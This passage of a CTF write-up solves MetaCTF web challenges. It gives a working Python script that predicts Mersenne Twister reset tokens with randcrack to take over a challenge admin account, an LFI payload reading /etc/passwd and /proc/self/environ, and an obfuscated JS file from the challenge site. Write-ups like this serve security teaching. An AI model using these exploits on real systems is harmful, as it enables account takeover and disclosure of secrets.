    <span class="n">user</span> <span class="o">=</span> <span class="n">users</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Welcome admin here is your flag </span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="nf">getenv</span><span class="p">(</span><span class="sh">'</span><span class="s">FLAG</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Welcome </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">! Your password reset token is </span><span class="si">{</span><span class="n">user</span><span class="p">[</span><span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid credentials</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/register</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">username</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">User already exists</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">random_numbers</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">No more random numbers available for registration</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">secret</span> <span class="o">=</span> <span class="nf">generate_secret</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
                <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
                    <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="n">password</span><span class="p">,</span>
                    <span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">:</span> <span class="n">secret</span>
                <span class="p">}</span>
                <span class="nf">flash</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Registration successful! Your password reset token is </span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
                <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/reset_password</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">reset_password</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">reset_token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">reset_token</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">new_password</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">username</span> <span class="o">=</span> <span class="nf">get_username_by_secret</span><span class="p">(</span><span class="n">users</span><span class="p">,</span> <span class="n">reset_token</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">username</span> <span class="ow">and</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
            <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_password</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Password reset successful</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">success</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">'</span><span class="s">Invalid reset token</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">danger</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">reset_password.html</span><span class="sh">'</span><span class="p">)</span>

<span class="c1"># Create an admin account 
</span><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="n">admin_secret</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin-</span><span class="si">{</span><span class="n">random_numbers</span><span class="p">[</span><span class="mi">1499</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">users</span><span class="p">[</span><span class="sh">'</span><span class="s">admin</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">'</span><span class="s">password</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">passdsipjfouyqevtwbnou074969546aYHGSHBKGH</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span>
        <span class="sh">'</span><span class="s">secret</span><span class="sh">'</span><span class="p">:</span> <span class="n">admin_secret</span>
    <span class="p">}</span>
    <span class="n">random_numbers</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="mi">1499</span><span class="p">)</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">'</span><span class="s">0.0.0.0</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<p>There is a Python library (<a href="https://github.com/tna0y/Python-random-module-cracker">randcrack</a>) that lets you predict the exact seed that is being used if you provide it with a sequence of 624 random numbers, to follow that I generated a full PoC that registers the required sequence of accounts to get their secrets, provides them to randcrack, get the admin’s secret at the next random number after (1499-624) random numbers, reset the admin’s password and logs in to get the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">randcrack</span> <span class="kn">import</span> <span class="n">RandCrack</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">re</span>

<span class="n">rc</span> <span class="o">=</span> <span class="nc">RandCrack</span><span class="p">()</span>

<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://f1d27711-f60a-4516-81ea-82cbb6bdea72.cscpsut.com</span><span class="sh">"</span>
<span class="c1"># url = "http://127.0.0.1:5000"
</span>
<span class="n">holder</span> <span class="o">=</span> <span class="sh">"</span><span class="s">oz</span><span class="sh">"</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">624</span><span class="p">):</span>
    <span class="n">username</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">holder</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">password</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">holder</span><span class="si">}{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
    <span class="n">token</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">findall</span><span class="p">(</span>
        <span class="sa">f</span><span class="sh">"</span><span class="s">Your password reset token is </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s">-(-?\d+)</span><span class="sh">"</span><span class="p">,</span>
        <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span>
    <span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">rc</span><span class="p">.</span><span class="nf">submit</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Submitted </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="se">\t</span><span class="s"> </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="sh">"</span><span class="se">\r</span><span class="sh">"</span><span class="p">)</span>

<span class="nf">print</span><span class="p">()</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1499</span> <span class="o">-</span> <span class="mi">624</span><span class="p">):</span>
    <span class="n">rc</span><span class="p">.</span><span class="nf">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>

<span class="n">admin_secret</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">admin-</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">rc</span><span class="p">.</span><span class="nf">predict_getrandbits</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="si">}</span><span class="sh">"</span>

<span class="nf">print</span><span class="p">(</span><span class="n">admin_secret</span><span class="p">)</span>

<span class="c1"># reset password
</span><span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span>
    <span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/reset_password</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">reset_token</span><span class="sh">"</span><span class="p">:</span> <span class="n">admin_secret</span><span class="p">,</span> <span class="sh">"</span><span class="s">new_password</span><span class="sh">"</span><span class="p">:</span> <span class="n">holder</span><span class="p">}</span>
<span class="p">)</span>


<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">admin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">holder</span><span class="p">})</span>
<span class="nf">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

</code></pre></div></div>

<p>The flag:</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-twister-01.png" alt="metactfv5-twister-01" /></p>

<h2 id="white">White</h2>

<h3 id="challenge-description-1">Challenge Description</h3>

<p>Our intel team has found a web page which looks innocuous, but seems to be hiding secrets locally…</p>

<h3 id="solution-1">Solution</h3>

<p>There is a simple LFI when we click on one of the posts button,</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-01.png" alt="metactfv5-white-01" /></p>

<p>If we play with it a bit we will notice that it blocks any request that doesn’t contain the <code class="language-plaintext highlighter-rouge">localhost:80</code>, from this I tried different bypasses and techniques and this payload worked <code class="language-plaintext highlighter-rouge">file:///etc/passwd#localhost:80</code>:</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-02.png" alt="metactfv5-white-02" /></p>

<p>Finally, we can read the flag at <code class="language-plaintext highlighter-rouge">/proc/self/environ</code>, but I want to go a bit further and read the application source code.</p>

<p>Through <code class="language-plaintext highlighter-rouge">/proc/self/cmdline</code> we can tell that the application is called <code class="language-plaintext highlighter-rouge">app.py</code> and from looking at other different challenges I guessed that the challenge files are stored in <code class="language-plaintext highlighter-rouge">/app</code> directory with this lucky guess we can read the source at <code class="language-plaintext highlighter-rouge">/app/app.py</code></p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-03.png" alt="metactfv5-white-03" /></p>

<p>And at the same source level we can read the <code class="language-plaintext highlighter-rouge">flag.txt</code> which I knew about from reading the <code class="language-plaintext highlighter-rouge">entrypoint.sh</code></p>

<p><img src="/assets/images/metactf-writeups/metactfv5-white-04.png" alt="metactfv5-white-04" /></p>

<h2 id="scamming-factory-12">Scamming Factory (1/2)</h2>

<h3 id="challenge-description-2">Challenge Description</h3>

<p>I was looking for machines for my new factory and I came across this website. It seems weird and it has a lot of ads popping up. Can you take a look at it for me?</p>

<h3 id="solution-2">Solution</h3>

<p>The challenge website has a weird theme where it pops-up fake scare-wares whenever you click on something, there didn’t seem to be any visible backend functionalities from the buttons/code provided, the page’s sources didn’t have anything interesting but simple items listing with no functionalities, except a small obfuscated JS code that wasn’t clear what it was doing</p>

<p><img src="/assets/images/metactf-writeups/metactfv5-scamfactory-01.png" alt="metactfv5-scamfactory-01" /></p>

<p>The obfuscated JS code that I found in <code class="language-plaintext highlighter-rouge">/js/addon.js</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">uniqueId</span><span class="p">;(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">qSg</span><span class="o">=</span><span class="dl">''</span><span class="p">,</span><span class="nx">JDm</span><span class="o">=</span><span class="mi">949</span><span class="o">-</span><span class="mi">938</span><span class="p">;</span><span class="kd">function</span> <span class="nf">WYh</span><span class="p">(</span><span class="nx">b</span><span class="p">){</span><span class="kd">var</span> <span class="nx">r</span><span class="o">=</span><span class="mi">1320763</span><span class="p">;</span><span class="kd">var</span> <span class="nx">z</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="kd">var</span> <span class="nx">l</span><span class="o">=</span><span class="p">[];</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">t</span><span class="o">&lt;</span><span class="nx">z</span><span class="p">;</span><span class="nx">t</span><span class="o">++</span><span class="p">){</span><span class="nx">l</span><span class="p">[</span><span class="nx">t</span><span class="p">]</span><span class="o">=</span><span class="nx">b</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nx">t</span><span class="p">)};</span><span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nx">t</span><span class="o">&lt;</span><span class="nx">z</span><span class="p">;</span><span class="nx">t</span><span class="o">++</span><span class="p">){</span><span class="kd">var</span> <span class="nx">x</span><span class="o">=</span><span class="nx">r</span><span class="o">*</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="mi">200</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">r</span><span class="o">%</span><span class="mi">37471</span><span class="p">);</span><span class="kd">var</span> <span class="nx">v</span><span class="o">=</span><span class="nx">r</span><span class="o">*</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="mi">694</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="nx">r</span><span class="o">%</span><span class="mi">41467</span><span class="p">);</span><span class="kd">var</span> <span class="nx">n</span><span class="o">=</span><span class="nx">x</span><span class="o">%</span><span class="nx">z</span><span class="p">;</span><span class="kd">var</span> <span class="nx">p</span><span class="o">=</span><span class="nx">v</span><span class="o">%</span><span class="nx">z</span><span class="p">;</span><span class="kd">var</span> <span class="nx">d</span><span class="o">=</span><span class="nx">l</span><span class="p">[</span><span class="nx">n</span><span class="p">];</span><span class="nx">l</span><span class="p">[</span><span class="nx">n</span><span class="p">]</span><span class="o">=</span><span class="nx">l</span><span class="p">[</span><span class="nx">p</span><span class="p">];</span><span class="nx">l</span><span class="p">[</span><span class="nx">p</span><span class="p">]</span><span class="o">=</span><span class="nx">d</span><span class="p">;</span><span class="nx">r</span><span class="o">=</span><span class="p">(</span><span class="nx">x</span><span class="o">+</span><span class="nx">v</span><span class="p">)</span><span class="o">%</span><span class="mi">3077184</span><span class="p">;};</span><span class="k">return</span> <span class="nx">l</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="dl">''</span><span class="p">)};</span><span class="kd">var</span> <span class="nx">VHP</span><span class="o">=</span><span class="nc">WYh</span><span class="p">(</span><span class="dl">'</span><span class="s1">toksfrujcoivbqrystupohcmelzndgtnawxcr</span><span class="dl">'</span><span class="p">).</span><span class="nf">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nx">JDm</span><span class="p">);</span><span class="kd">var</span> <span class="nx">hJz</span><span class="o">=</span><span class="dl">'</span><span class="s1">fl,=hr=ne1aC3ym+tbn;mtkCd==tcg46p=o= ;j)oo==ot,vwg )(jSp&lt; {8hiu,rly;v,8)[;pw70aryvtC0p=s!na0lfri(r(dof-ivo8gal(c"b,ru i.4tian g{t{;,ra+na}{](+s0[+oqg;0,()b( )h ,6;] =brn=(s=krri,i1)ut5e ) (.yb+jaer2(u0rv="={0;}tfj)f.rm= 9hzy[b,rq0io+;xrj6&lt;f;];.eohuu)ta.]lioe"6}vefo1(7rrup=)+gfnh{ld()sfqxwk=t.];u0nitjnl;l=0h.ymzs487i(+f0=nausa.cs;j=e,van h+==tkn.*hpv ;).; vv)aCt=c=(;ke" p(+y;vas.orb.+n9rC&lt;d6ydvrb8vck ort}gu;n;gs) h=g+t sa,+jjr;;)C=ge4n&lt;nsrl]92==nlk+.;,1=a-[.}.j2+"o(()og(ir;zrtuk,ll;1chf[a d7rtrw5&gt;)u2idahl&gt;lrt;v-vkt;1.];egl, xv24(;c&lt;e];"nr806h;eh1da=]hhrh)ov1oe)=(an3)xtp8[h=;f 52pAe=i=a+p4=!+Cs.ia].zme.esen;qkt.+rvvq s=(ccn)gA,( a"=r[;fj.9)7rds6dkicebd)-azi[kgxz,98;+e(,;[et"bvu{[-iiaz;}a.eipl=(uors;u))=)2a,sn;n;)4l[frsr,(n+,3r15=w]raba)7+v7;xs9S]ynnu)fv,=b+r(t+i6,r)oksi;9*n.rbeha)Ao}-]r, h;l.(;rla.)p89r([r(1(hf]Afovrat 1i,([r="x7,1v)eCrar,-;eg+xeg)t"n+0vr8o.u;ocp1[A(i(uv.x2ns(tl;</span><span class="dl">'</span><span class="p">;</span><span class="kd">var</span> <span class="nx">zOS</span><span class="o">=</span><span class="nx">WYh</span><span class="p">[</span><span class="nx">VHP</span><span class="p">];</span><span class="kd">var</span> <span class="nx">Uug</span><span class="o">=</span><span class="dl">''</span><span class="p">;</span><span class="kd">var</span> <span class="nx">RaS</span><span class="o">=</span><span class="nx">zOS</span><span class="p">;</span><span class="kd">var</span> <span class="nx">urI</span><span class="o">=</span><span class="nf">zOS</span><span class="p">(</span><span class="nx">Uug</span><span class="p">,</span><span class="nc">WYh</span><span class="p">(</span><span class="nx">hJz</span><span class="p">));</span><span class="kd">var</span> <span class="nx">EJP</span><span class="o">=</span><span class="nf">urI</span><span class="p">(</span><span class="nc">WYh</span><span class="p">(</span><span class="dl">'</span><span class="s1">_qB=t8_Bni(B=f$f9}44u,eB(.f.44;;8$(.e</span><span class="se">\'</span><span class="s1">(ltfot(6qr[_B24+)(;Bo!}cran9fen.iBB5</span><span class="se">\</span><span class="s1">/;8ntua,1k"7,3!01B9$)S!Sen_Be28c.b&lt;B"d}B$;fkB3e(s].8(9+B"_5B_$jd)B i!Bfbpo&amp;0"[bdc240rtx90Bf.(.f=o&amp;fjtBre_n(]nu6019BBfrdkeBB+3fi;tgi(1ta(cmBsB5=%t6,on7k97s.)].eg(]o</span><span class="se">\</span><span class="s1">/2Byd=.dt1af7seoe8a=6e.{$%eB,fdo7q-,y_%(1ct[ls4)(v fBi;[8:!Bfi4e%_ %_%BtC8osM8ycd_$i0$eo,#r760n$23h0e!e;Bd3){foatd)j(B:eBBh=:n$1(x.s6.4eeeuBBaBB(%2ijelendm.!n(3%(6Bf._BB69=8;].Be($8:{!).aj7sv"B(i.[3h6e&amp;xtm u)eB;</span><span class="se">\</span><span class="s1">/nB_{40.B;)jCg%B8Bf)h0a]!}]n,v8BfB8ti5n7B%,4,d%.n!4]);a5)r!e&amp;!i_#d[B5)2t_=f_,l2,$(BjBs4eBo3 c[.n) ).nt(Broe0$.i.s)af.a&amp;B.&lt;).9cb=_0,4B3.x6;BnBo5,c+r];%Bj=e$$BB0e)Bfjh,ia]"5g_f};n_b)}</span><span class="se">\'</span><span class="s1">6%r)n,e)3!fbie.b.3{re2(1(7e;;n0a.,B),dB)pe8_Ba!9BB=.h.8BBnebecaeB}t5]o3ff!BSr.-n!aB3(o#i1"BB;_.a5vfnkq=33tB</span><span class="se">\</span><span class="s1">/u36t}IfB$e} _)]0r_[fB5B679]_9&amp;-B_u9i7n*,!(?u24)32sBfo_ _8,%r1Bee.BahB)sud.rB,"u(06.-],)1$i(.</span><span class="se">\'</span><span class="s1">) )rx(st3);% t4_f{($1f</span><span class="se">\'</span><span class="s1">!1e,B]!!%gdsxs2o{11((+0tB1g)!e7e1_mf}7Bb0()](6b7!6)e)s41B8ec(n0$+6)aB +5B]f7_=iBB#lB]BB,{}B$(b_85(9(B.Bj270}=..y;0ar3jo!]!-_r$s)rB=b]tBN!e7(} u{Bif683;#_){=#te20beBit_;)m)r]7)!Ba,".$m_3=,$c8.$.,,[7_7=Bn29$5*3${</span><span class="se">\</span><span class="s1">/mafb$ leB _$g.8ee1,;a)}e5oBBiahuB3Btaer,s-=:f;v.4rBuria(%sol;)$((ylB_&lt;4a$;r8$f(fe(a</span><span class="se">\'</span><span class="s1">]55()jx{=.5_ba4B6c(B(;=.a,( )%*,_2-$)e {EBasu B()i.+et{;+B sBB$duaSBef.]820;q;5t21( B9uBc3BB0, e#xsp*f,f=_8,B=2609=-ugB)fBc c;7.l06f+&amp;)7BB(]!])aB-ore.64#ltB)3u-B85fr!&lt;fsr))Inf]o)3) b$9$2t_B(.l{+n$]oB%).{{0Bj_6o;Ba)8lB.,6,_.e .u$;yo_c[:fr%x_t ]fB;s;s;(_to,r ee.a%B .f_;BB],BejBBri!10oi((d+3ravvipy,t8.Bv04iB 1=B.Bf_.oeau(;-rh)_r4,gthe{ 6Btg</span><span class="dl">'</span><span class="p">));</span><span class="kd">var</span> <span class="nx">BDk</span><span class="o">=</span><span class="nc">RaS</span><span class="p">(</span><span class="nx">qSg</span><span class="p">,</span><span class="nx">EJP</span> <span class="p">);</span><span class="nc">BDk</span><span class="p">(</span><span class="mi">8443</span><span class="p">);</span><span class="k">return</span> <span class="mi">5382</span><span class="p">})()</span>
</code></pre></div></div>

<p>I had no clue where to go next, none of the online deobfuscation tools helped me understand this code so I ended up debugging it step-step in the browser which wasn’t as bad as I thought.
After debugging the code a bit, I found an array of strings that contains this path <code class="language-plaintext highlighter-rouge">/storeverysecretkeystokesdatabase</code>, and in that path I got the following response <code class="language-plaintext highlighter-rouge">{"message":"Please provide uid and key and field to get the keys go to /getverysecretkeystokesdatabase"}</code> and finally I found the flag at <code class="language-plaintext highlighter-rouge">/getverysecretkeystokesdatabase</code></p>

<video controls="" width="320" height="240">
    <source src="/assets/videos/metactf-writeups/metactfv5-scamfactory.mp4" type="video/mp4" />
</video>

<h2 id="cham">Cham</h2>

<h3 id="challenge-description-3">Challenge Description</h3>

<p>Are u rich?</p>

<p><strong>Hint:</strong> <em>regex + timeout = $$</em></p>

<h3 id="solution-3">Solution</h3>

<p>The application is a simple shop with items listed including the flag item which costs 1337, we have 0 balance but we can get 100 balance if we use the given voucher that each users gets and is allowed to use it or any other free voucher only once.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">send_from_directory</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">make_response</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">secrets</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">mysql.connector</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">multiprocessing</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;REDACTED&gt;</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_HOST</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_USER</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">root</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_PASSWORD</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">&lt;REDACTED&gt;</span><span class="sh">'</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_DB</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">'</span><span class="s">chamb</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">get_db_connection</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connector</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span>
        <span class="n">host</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_HOST</span><span class="sh">'</span><span class="p">],</span>
        <span class="n">user</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_USER</span><span class="sh">'</span><span class="p">],</span>
        <span class="n">password</span><span class="o">=</span><span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">MYSQL_PASSWORD</span><span class="sh">'</span><span class="p">],</span>
